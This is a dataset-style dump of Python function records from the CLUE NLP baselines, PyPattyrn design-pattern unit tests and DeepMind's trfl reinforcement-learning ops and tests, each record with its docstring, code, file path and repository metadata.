"CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nReference : https://github.com/tensorflow/tensorflow/blob/r1.10/tensorflow/python/ops/candidate_sampling_ops.py\n    `P(class) = (log(class + 2) - log(class + 1)) / log(range_max + 1)`\n\nexpected count can be approximated by 1 - (1 - p)^n\nand we use a numerically stable version -expm1(num_tries * log1p(-p))\n\nOur implementation fixes num_tries at 2 * n_sample, and the actual #samples will vary from run to run\n\"\"\"\n", "func_signal": "def __init__(self, range_max, n_sample):\n", "code": "with torch.no_grad():\n    self.range_max = range_max\n    log_indices = torch.arange(1., range_max+2., 1.).log_()\n    self.dist = (log_indices[1:] - log_indices[:-1]) / log_indices[-1]\n\n    self.log_q = (- (-self.dist.double().log1p_() * 2 * n_sample).expm1_()).log_().float()\n\nself.n_sample = n_sample", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/modeling_transfo_xl_utilities.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Loads a data file into a list of `InputBatch`s.\"\"\"\n\n", "func_signal": "def convert_examples_to_features(examples, label_list, max_seq_length, tokenizer):\n", "code": "print(\"#examples\", len(examples))\n\nlabel_map = {}\nfor (i, label) in enumerate(label_list):\n    label_map[label] = i\n\nfeatures = [[]]\nfor (ex_index, example) in enumerate(tqdm(examples)):\n    tokens_a = tokenizer.tokenize(example.text_a)\n\n    tokens_b = tokenizer.tokenize(example.text_b)\n\n    tokens_c = tokenizer.tokenize(example.text_c)\n\n    _truncate_seq_tuple(tokens_a, tokens_b, tokens_c, max_seq_length - 4)\n    tokens_b = tokens_c + [\"[SEP]\"] + tokens_b\n\n    tokens = []\n    segment_ids = []\n    tokens.append(\"[CLS]\")\n    segment_ids.append(0)\n    for token in tokens_a:\n        tokens.append(token)\n        segment_ids.append(0)\n    tokens.append(\"[SEP]\")\n    segment_ids.append(0)\n\n    if tokens_b:\n        for token in tokens_b:\n            tokens.append(token)\n            segment_ids.append(1)\n        tokens.append(\"[SEP]\")\n        segment_ids.append(1)\n\n    input_ids = tokenizer.convert_tokens_to_ids(tokens)\n\n    # The mask has 1 for real tokens and 0 for padding tokens. Only real\n    # tokens are attended to.\n    input_mask = [1] * len(input_ids)\n\n    # Zero-pad up to the sequence length.\n    while len(input_ids) < max_seq_length:\n        input_ids.append(0)\n        input_mask.append(0)\n        segment_ids.append(0)\n\n    assert len(input_ids) == max_seq_length\n    assert len(input_mask) == max_seq_length\n    assert len(segment_ids) == max_seq_length\n\n    label_id = label_map[example.label]\n    if ex_index < 5:\n        logger.info(\"*** Example ***\")\n        logger.info(\"guid: %s\" % (example.guid))\n        logger.info(\"tokens: %s\" % \" \".join(\n            [tokenization.printable_text(x) for x in tokens]))\n        logger.info(\"input_ids: %s\" % \" \".join([str(x) for x in input_ids]))\n        logger.info(\"input_mask: %s\" % \" \".join([str(x) for x in input_mask]))\n        logger.info(\n            \"segment_ids: %s\" % \" \".join([str(x) for x in segment_ids]))\n        logger.info(\"label: %s (id = %d)\" % (example.label, label_id))\n\n    features[-1].append(\n        InputFeatures(\n            input_ids=input_ids,\n            input_mask=input_mask,\n            segment_ids=segment_ids,\n            label_id=label_id))\n    if len(features[-1]) == n_class:\n        features.append([])\n\nif len(features[-1]) == 0:\n    features = features[:-1]\nprint('#features', len(features))\nreturn features", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nTokenize a string given language code. For Chinese, Japanese and Thai, we use a language specific tokenizerself. Otherwise, we use Moses.\n\nDetails of tokenization:\n- [sacremoses](https://github.com/alvations/sacremoses): port of Moses\n    - Install with `pip install sacremoses`\n- [pythainlp](https://github.com/PyThaiNLP/pythainlp): Thai tokenizer\n    - Install with `pip install pythainlp`\n- [kytea](https://github.com/chezou/Mykytea-python): Japanese tokenizer, wrapper of [KyTea](https://github.com/neubig/kytea)\n    - Install with the following steps:\n    ```\n    git clone git@github.com:neubig/kytea.git && cd kytea\n    autoreconf -i\n    ./configure --prefix=$HOME/local\n    make && make install\n    pip install kytea\n    ```\n- [jieba](https://github.com/fxsjy/jieba): Chinese tokenizer *\n    - Install with `pip install jieba`\n\n\\* The original XLM used [Stanford Segmenter](https://nlp.stanford.edu/software/stanford-segmenter-2018-10-16.zip).\nHowever, the wrapper (`nltk.tokenize.stanford_segmenter`) is slow due to JVM overhead, and it will be deprecated.\nJieba is a lot faster and pip-installable. Note there is some mismatch with the Stanford Segmenter. It should be fine\nif you fine-tune the model with Chinese supervisionself. If you want the same exact behaviour, use the original XLM\n[preprocessing script](https://github.com/facebookresearch/XLM/tree/master/tools) to tokenize the sentence externally,\nand set `bypass_tokenizer=True` to bypass the tokenizer.\n\nArgs:\n    - lang: ISO language code (default = 'en') (string). Languages should belong of the model supported languages. However, we don't enforce it.\n    - bypass_tokenizer: Allow users to preprocess and tokenize the sentences externally (default = False)  (bool). If True, we only apply BPE.\n\nReturns:\n    List of tokens.\n\"\"\"\n", "func_signal": "def _tokenize(self, text, lang='en', bypass_tokenizer=False):\n", "code": "if lang and self.lang2id and lang not in self.lang2id:\n    logger.error(\"Supplied language code not found in lang2id mapping. Please check that your language is supported by the loaded pretrained model.\")\nif bypass_tokenizer:\n    text = text.split()\nelif lang not in self.lang_with_custom_tokenizer:\n    text = self.moses_pipeline(text, lang=lang)\n    # TODO: make sure we are using `xlm-mlm-enro-1024`, since XLM-100 doesn't have this step\n    if lang == 'ro':\n        text = romanian_preprocessing(text)\n    text = self.moses_tokenize(text, lang=lang)\nelif lang == 'th':\n    text = self.moses_pipeline(text, lang=lang)\n    try:\n        if 'pythainlp' not in sys.modules:\n            from pythainlp.tokenize import word_tokenize as th_word_tokenize\n        else:\n            th_word_tokenize = sys.modules['pythainlp'].word_tokenize\n    except (AttributeError, ImportError) as e:\n        logger.error(\"Make sure you install PyThaiNLP (https://github.com/PyThaiNLP/pythainlp) with the following steps\")\n        logger.error(\"1. pip install pythainlp\")\n        raise e\n    text = th_word_tokenize(text)\nelif lang == 'zh':\n    try:\n        if 'jieba' not in sys.modules:\n            import jieba\n        else:\n            jieba = sys.modules['jieba']\n    except (AttributeError, ImportError) as e:\n        logger.error(\"Make sure you install Jieba (https://github.com/fxsjy/jieba) with the following steps\")\n        logger.error(\"1. pip install jieba\")\n        raise e\n    text = ' '.join(jieba.cut(text))\n    text = self.moses_pipeline(text, lang=lang)\n    text = text.split()\nelif lang == 'ja':\n    text = self.moses_pipeline(text, lang=lang)\n    text = self.ja_tokenize(text)\nelse:\n    raise ValueError('It should not reach here')\n\nif self.do_lowercase_and_remove_accent and not bypass_tokenizer:\n    text = lowercase_and_remove_accent(text)\n\nsplit_tokens = []\nfor token in text:\n    if token:\n        split_tokens.extend([t for t in self.bpe(token).split(' ')])\n\nreturn split_tokens", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Truncates a sequence pair in place to the maximum length.\"\"\"\n\n# This is a simple heuristic which will always truncate the longer sequence\n# one token at a time. This makes more sense than truncating an equal percent\n# of tokens from each, since if one sequence is very short then each token\n# that's truncated likely contains more information than a longer sequence.\n", "func_signal": "def _truncate_seq_pair(tokens_a, tokens_b, max_length):\n", "code": "while True:\n    total_length = len(tokens_a) + len(tokens_b)\n    if total_length <= max_length:\n        break\n    if len(tokens_a) > len(tokens_b):\n        tokens_a.pop()\n    else:\n        tokens_b.pop()", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nTest the execute method with a valid command for the Worker Invoker.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_valid_execute(self):\n", "code": "self.assertEquals(\"Temperature lowered by 5 degrees\", self.worker.execute(self.lower_temp_command))\nself.assertEquals(\"Temperature raised by 5 degrees\", self.worker.execute(self.raise_temp_command))", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the handle method with a successful request\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_success_handle(self):\n", "code": "chain = self.chain_class()\n\nself.assertEquals(\"Handled in chain link one\", chain.handle(\"handle_one\"))\nself.assertEquals(\"Handled in chain link two\", chain.handle(\"handle_two\"))\nself.assertEquals(\"Handled in chain link three\", chain.handle(\"handle_three\"))", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the action method with an invalid action.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_invalid_action(self):\n", "code": "with self.assertRaises(AttributeError):\n    self.thermostat.action('foo')", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "class Thermostat(Receiver):\n    def raise_temp(self, amount):\n        return \"Temperature raised by {0} degrees\".format(amount)\n\n    def lower_temp(self, amount):\n        return \"Temperature lowered by {0} degrees\".format(amount)\n\nclass RaiseTempCommand(Command):\n    def __init__(self, receiver, amount=5):\n        super().__init__(receiver)\n        self.amount = amount\n\n    def execute(self):\n        return self._receiver.action('raise_temp', self.amount)\n\n    def unexecute(self):\n        return self._receiver.action('lower_temp', self.amount)\n\nclass LowerTempCommand(Command):\n    def __init__(self, receiver, amount=5):\n        super().__init__(receiver)\n        self.amount = amount\n\n    def execute(self):\n        return self._receiver.action('lower_temp', self.amount)\n\n    def unexecute(self):\n        return self._receiver.action('raise_temp', self.amount)\n\nclass Worker(Invoker):\n    def __init__(self):\n        super().__init__([LowerTempCommand, RaiseTempCommand])\n\nself.worker = Worker()\nself.receiver = Thermostat()\nself.lower_temp_command = LowerTempCommand(self.receiver)\nself.raise_temp_command = RaiseTempCommand(self.receiver)", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the handle method with unsuccessful requests.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_fail_handle(self):\n", "code": "handler = self.chain_link_one_class()\nwith self.assertRaises(AttributeError):\n    handler.handle(\"foo\")", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest looping over an Iterator class.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_loop(self):\n", "code": "counter_iterator = self.counter_iterator_class()\ni = 0\nfor count in counter_iterator:\n    self.assertEquals(i, count)\n    i += 1", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest that StopIteration is raised.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_stop_iteration(self):\n", "code": "counter = self.counter_class(0)\nwith self.assertRaises(StopIteration):\n    counter.__next__()", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the iterables next method.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_next(self):\n", "code": "counter = self.counter_class(10)\nfor i in range(10):\n    self.assertEquals(i, counter.__next__())", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "class Thermostat(Receiver):\n    def raise_temp(self, amount):\n        return \"Temperature raised by {0} degrees\".format(amount)\n\n    def lower_temp(self, amount):\n        return \"Temperature lowered by {0} degrees\".format(amount)\n\nclass RaiseTempCommand(Command):\n    def __init__(self, receiver, amount=5):\n        super().__init__(receiver)\n        self.amount = amount\n\n    def execute(self):\n        return self._receiver.action('raise_temp', self.amount)\n\n    def unexecute(self):\n        return self._receiver.action('lower_temp', self.amount)\n\nclass LowerTempCommand(Command):\n    def __init__(self, receiver, amount=5):\n        super().__init__(receiver)\n        self.amount = amount\n\n    def execute(self):\n        return self._receiver.action('lower_temp', self.amount)\n\n    def unexecute(self):\n        return self._receiver.action('raise_temp', self.amount)\n\nself.thermostat = Thermostat()\nself.raise_temp_command_class = RaiseTempCommand\nself.lower_temp_command_class = LowerTempCommand", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the handle method with unsuccessful requests.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_fail_handle(self):\n", "code": "chain = self.chain_class()\n\nself.assertEquals(\"Fail\", chain.handle(\"foo\"))", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the built in next method on the Iterator.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_next(self):\n", "code": "counter_iterator = self.counter_iterator_class()\nfor i in range(10):\n    self.assertEquals(i, next(counter_iterator))", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n", "func_signal": "def setUp(self):\n", "code": "class Counter(Iterable):\n\n    def __init__(self, max):\n        self.count = 0\n        self.max = max\n\n    def __next__(self):\n        self.count += 1\n        if self.count > self.max:\n            raise StopIteration\n        else:\n            return self.count - 1\n\nclass CounterIterator(Iterator):\n\n    def __init__(self):\n        super().__init__(Counter(10))\n\nself.counter_iterator_class = CounterIterator", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "class Thermostat(Receiver):\n    def raise_temp(self, amount):\n        return \"Temperature raised by {0} degrees\".format(amount)\n\n    def lower_temp(self, amount):\n        return \"Temperature lowered by {0} degrees\".format(amount)\n\nself.thermostat = Thermostat()", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the action method with a valid action.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_valid_action(self):\n", "code": "self.assertEquals(\"Temperature raised by 5 degrees\", self.thermostat.action('raise_temp', 5))\nself.assertEquals(\"Temperature lowered by 5 degrees\", self.thermostat.action('lower_temp', 5))", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest that stop iteration is raised.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_stop_iteration(self):\n", "code": "counter_iterator = self.counter_iterator_class()\n\nwith self.assertRaises(StopIteration):\n    for i in range(12):\n        next(counter_iterator)", "path": "PyPattyrn/tests/behavioral_tests/test_iterator.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the handle method with successful requests.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_success_handle(self):\n", "code": "handler = self.chain_link_one_class()\n\nself.assertEquals(\"Handled in chain link one\", handler.handle(\"handle_one\"))\nself.assertEquals(\"Handled in chain link two\", handler.handle(\"handle_two\"))\nself.assertEquals(\"Handled in chain link three\", handler.handle(\"handle_three\"))", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the undo method.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_undo(self):\n", "code": "self.worker.execute(self.raise_temp_command)\n\nself.assertIn(self.raise_temp_command, self.worker._history)\nself.assertEquals(\"Temperature lowered by 5 degrees\", self.worker.undo())\nself.assertNotIn(self.raise_temp_command, self.worker._history)", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "class ConcreteChainLinkThree(ChainLink):\n\n    def handle(self, request):\n        if request == 'handle_three':\n            return \"Handled in chain link three\"\n        else:\n            return self.successor_handle(request)\n\nclass ConcreteChainLinkTwo(ChainLink):\n\n    def __init__(self):\n        super().__init__()\n        self.set_successor(ConcreteChainLinkThree())\n\n    def handle(self, request):\n        if request == 'handle_two':\n            return \"Handled in chain link two\"\n        else:\n            return self.successor_handle(request)\n\nclass ConcreteChainLinkOne(ChainLink):\n\n    def __init__(self):\n        super().__init__()\n        self.set_successor(ConcreteChainLinkTwo())\n\n    def handle(self, request):\n        if request == 'handle_one':\n            return \"Handled in chain link one\"\n        else:\n            return self.successor_handle(request)\n\nself.chain_link_one_class = ConcreteChainLinkOne", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nTest the execute method.\n\n@raise AssertionError: If the test fails.\n\"\"\"\n", "func_signal": "def test_execute(self):\n", "code": "raise_temp_command = self.raise_temp_command_class(self.thermostat, 10)\nlower_temp_command = self.lower_temp_command_class(self.thermostat, 5)\n\nself.assertEquals(\"Temperature raised by 10 degrees\", raise_temp_command.execute())\nself.assertEquals(\"Temperature lowered by 5 degrees\", lower_temp_command.execute())", "path": "PyPattyrn/tests/behavioral_tests/test_command.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"\nInitialize testing data.\n\"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "class ConcreteChainLinkThree(ChainLink):\n\n    def handle(self, request):\n        if request == 'handle_three':\n            return \"Handled in chain link three\"\n        else:\n            return self.successor_handle(request)\n\nclass ConcreteChainLinkTwo(ChainLink):\n\n    def __init__(self):\n        super().__init__()\n        self.set_successor(ConcreteChainLinkThree())\n\n    def handle(self, request):\n        if request == 'handle_two':\n            return \"Handled in chain link two\"\n        else:\n            return self.successor_handle(request)\n\nclass ConcreteChainLinkOne(ChainLink):\n\n    def __init__(self):\n        super().__init__()\n        self.set_successor(ConcreteChainLinkTwo())\n\n    def handle(self, request):\n        if request == 'handle_one':\n            return \"Handled in chain link one\"\n        else:\n            return self.successor_handle(request)\n\nclass ConcreteChain(Chain):\n\n    def __init__(self):\n        super().__init__(ConcreteChainLinkOne())\n\n    def fail(self):\n        return 'Fail'\n\nself.chain_class = ConcreteChain", "path": "PyPattyrn/tests/behavioral_tests/test_chain.py", "commit_date": "2016-09-11 00:00:00", "repo_name": "tylerlaberge/PyPattyrn", "stars": 2178, "license": "mit", "language": "python", "size": 234}
{"docstring": "\"\"\"Computes an epsilon-greedy distribution over actions.\n\nThis returns a categorical distribution over a discrete action space. It is\nassumed that the trailing dimension of `action_values` is of length A, i.e.\nthe number of actions. It is also assumed that actions are 0-indexed.\n\nThis policy does the following:\n\n- With probability 1 - epsilon, take the action corresponding to the highest\naction value, breaking ties uniformly at random.\n- With probability epsilon, take an action uniformly at random.\n\nArgs:\n  action_values: A Tensor of action values with any rank >= 1 and dtype float.\n    Shape can be flat ([A]), batched ([B, A]), a batch of sequences\n    ([T, B, A]), and so on.\n  epsilon: A scalar Tensor (or Python float) with value between 0 and 1.\n  legal_actions_mask: An optional one-hot tensor having the shame shape and\n    dtypes as `action_values`, defining the legal actions:\n    legal_actions_mask[..., a] = 1 if a is legal, 0 otherwise.\n    If not provided, all actions will be considered legal and\n    `tf.ones_like(action_values)`.\n\nReturns:\n  policy: tfp.distributions.Categorical distribution representing the policy.\n\"\"\"\n", "func_signal": "def epsilon_greedy(action_values, epsilon, legal_actions_mask=None):\n", "code": "with tf.name_scope(\"epsilon_greedy\", values=[action_values, epsilon]):\n\n  # Convert inputs to Tensors if they aren't already.\n  action_values = tf.convert_to_tensor(action_values)\n  epsilon = tf.convert_to_tensor(epsilon, dtype=action_values.dtype)\n\n  # We compute the action space dynamically.\n  num_actions = tf.cast(tf.shape(action_values)[-1], action_values.dtype)\n\n  # Dithering action distribution.\n  if legal_actions_mask is None:\n    dither_probs = 1 / num_actions * tf.ones_like(action_values)\n  else:\n    dither_probs = 1 / tf.reduce_sum(\n        legal_actions_mask, axis=-1, keepdims=True) * legal_actions_mask\n\n  # Greedy action distribution, breaking ties uniformly at random.\n  max_value = tf.reduce_max(action_values, axis=-1, keepdims=True)\n  greedy_probs = tf.cast(tf.equal(action_values, max_value),\n                         action_values.dtype)\n  greedy_probs /= tf.reduce_sum(greedy_probs, axis=-1, keepdims=True)\n\n  # Epsilon-greedy action distribution.\n  probs = epsilon * dither_probs + (1 - epsilon) * greedy_probs\n\n  # Make the policy object.\n  policy = tfp.distributions.Categorical(probs=probs)\n\nreturn policy", "path": "trfl/trfl/policy_ops.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Calculates pixel control task rewards from observation sequence.\n\nThe observations are first split in a grid of KxK cells. For each cell a\ndistinct pseudo reward is computed as the average absolute change in pixel\nintensity for all pixels in the cell. The change in intensity is averaged\nacross both pixels and channels (e.g. RGB).\n\nThe `observations` provided to this function should be cropped suitably, to\nensure that the observations' height and width are a multiple of `cell_size`.\nThe values of the `observations` tensor should be rescaled to [0, 1]. In the\nUNREAL agent observations are cropped to 80x80, and each cell is 4x4 in size.\n\nSee \"Reinforcement Learning with Unsupervised Auxiliary Tasks\" by Jaderberg,\nMnih, Czarnecki et al. (https://arxiv.org/abs/1611.05397).\n\nArgs:\n  observations: A tensor of shape `[T+1,B,H,W,C...]`, where\n    * `T` is the sequence length, `B` is the batch size.\n    * `H` is height, `W` is width.\n    * `C...` is at least one channel dimension (e.g., colour, stack).\n    * `T` and `B` can be statically unknown.\n  cell_size: The size of each cell.\n\nReturns:\n  A tensor of pixel control rewards calculated from the observation. The\n  shape is `[T,B,H',W']`, where `H'` and `W'` are determined by the\n  `cell_size`. If evenly-divisible, `H' = H/cell_size`, and similar for `W`.\n\"\"\"\n# Calculate the absolute differences across the sequence.\n", "func_signal": "def pixel_control_rewards(observations, cell_size):\n", "code": "abs_diff = tf.abs(observations[1:] - observations[:-1])\n# Average over cells. `abs_diff` has shape [T,B,H,W,C...], e.g.,\n# [T,B,H,W,C] if we have a colour channel. We want to use the TF avg_pool3d\n# op, but it expects 5D inputs so we collapse all channel dimensions.\n# Merge remaining dimensions after W: [T,B,H,W,C'].\nfull_shape = tf.shape(abs_diff)\npreserved_shape = full_shape[:4]\ntrailing_shape = (tf.reduce_prod(full_shape[4:]),)\nshape = tf.concat([preserved_shape, trailing_shape], 0)\nabs_diff = tf.reshape(abs_diff, shape)\n# Apply the averaging using average pooling and reducing over channel.\navg_abs_diff = tf.nn.avg_pool3d(\n    abs_diff,\n    ksize=[1, 1, cell_size, cell_size, 1],\n    strides=[1, 1, cell_size, cell_size, 1],\n    padding=\"VALID\")  # [T,B,H',W',C'].\npseudo_rewards = tf.reduce_mean(\n    avg_abs_diff, axis=[4], name=\"pseudo_rewards\")  # [T,B,H',W'].\nsequence_batch = abs_diff.get_shape()[:2]\nnew_height_width = avg_abs_diff.get_shape()[2:4]\npseudo_rewards.set_shape(sequence_batch.concatenate(new_height_width))\nreturn pseudo_rewards", "path": "trfl/trfl/pixel_control_ops.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that td_error == target_value - v_tm1.\"\"\"\n", "func_signal": "def testTDError(self):\n", "code": "with self.test_session() as sess:\n  self.assertAllClose(\n      sess.run(self.value_learning.extra.td_error),\n      [-2, -2, -2, -2, -1.5, -1, -2, -1, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests V-trace against ground truth data calculated in python.\"\"\"\n", "func_signal": "def testVTrace(self, batch_size):\n", "code": "seq_len = 5\n\nvalues = {\n    # Note that this is only for testing purposes using well-formed inputs.\n    # In practice we'd be more careful about taking log() of arbitrary\n    # quantities.\n    'log_rhos':\n        np.log((_shaped_arange(seq_len, batch_size)) / batch_size /\n               seq_len + 1),\n    # T, B where B_i: [0.9 / (i+1)] * T\n    'discounts':\n        np.array([[0.9 / (b + 1)\n                   for b in range(batch_size)]\n                  for _ in range(seq_len)]),\n    'rewards':\n        _shaped_arange(seq_len, batch_size),\n    'values':\n        _shaped_arange(seq_len, batch_size) / batch_size,\n    'bootstrap_value':\n        _shaped_arange(batch_size) + 1.0,\n    'clip_rho_threshold':\n        3.7,\n    'clip_pg_rho_threshold':\n        2.2,\n}\n\noutput = vtrace_ops.vtrace_from_importance_weights(**values)\n\nwith self.test_session() as session:\n  output_v = session.run(output)\n\nground_truth_v = _ground_truth_calculation(**values)\nfor a, b in zip(ground_truth_v, output_v):\n  self.assertAllClose(a, b)", "path": "trfl/trfl/vtrace_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that target value == r_t + pcont_t * max q_t.\"\"\"\n", "func_signal": "def testTarget(self):\n", "code": "with self.test_session() as sess:\n  self.assertAllClose(\n      sess.run(self.extra_ops.target),\n      [-1, -1, -1, -1, -0.5, 0, -1, 0, 1])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that td_error == target_value - v_tm1.\"\"\"\n", "func_signal": "def testTDError(self):\n", "code": "with self.test_session() as sess:\n  self.assertAllClose(\n      sess.run(self.extra_ops.td_error),\n      [-2, -2, -2, -2, -1.5, -1, -2, -1, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that loss == 0.5 * td_error^2.\"\"\"\n", "func_signal": "def testLoss(self):\n", "code": "with self.test_session() as sess:\n  # Loss is 0.5 * td_error^2\n  self.assertAllClose(\n      sess.run(self.value_learning.loss),\n      [2, 2, 2, 2, 1.125, 0.5, 2, 0.5, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
